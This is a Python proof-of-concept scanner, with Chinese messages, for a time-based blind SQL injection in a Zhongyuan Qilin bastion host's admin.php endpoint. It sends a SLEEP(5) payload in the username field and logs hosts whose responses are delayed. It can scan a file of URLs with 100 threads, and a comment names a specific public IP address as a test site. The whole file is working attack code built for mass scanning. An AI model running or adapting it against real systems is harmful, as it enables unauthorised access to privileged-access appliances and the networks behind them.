import argparse, requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

#测试网站https://139.159.251.208:1443
def banner():
    test = """
                                               ______
______________________________________________ ___  /
___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
__  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
_  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
/_/                                                  
                                   author:NaA100
                                   date:2024-09-2
                                   version:1.0                    
"""
    print(test)


def poc(target):
    payload = '/admin.php?controller=admin_commonuser'
    data = "username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    headers = {
        "Content-Length": "78",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/128.0.0.0Safari/537.36",
        "Accept-Encoding": "gzip,deflate,br",
    }
    proxie = {
        "http": "http://127.0.0.1:7890",
        "https": "http://127.0.0.1:7890",
    }

    try:
        res1 = requests.get(url=target + payload, verify=False, proxies=proxie, timeout=10)
        time1 = res1.elapsed.total_seconds()
        if res1.status_code == 200 and 'result' in res1.text:
            res2 = requests.post(url=target + payload, verify=False, headers=headers, proxies=proxie, timeout=10,
                                 data=data)
            time2 = res2.elapsed.total_seconds()
            if time2 - time1 > 4 and time2 > 5:
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{target}\n')
                print(f"[+]该{target}存在sql注入漏洞")
            else:
                print(f"[-]该{target}不存在sql注入漏洞")
        else:
            print(f"该{target}可能存在问题，请手工检测")
    except Exception as e:
        print(e)


def main():
    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="中远麒麟堡垒机存在SQL注入")

    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")


if __name__ == '__main__':
    main()
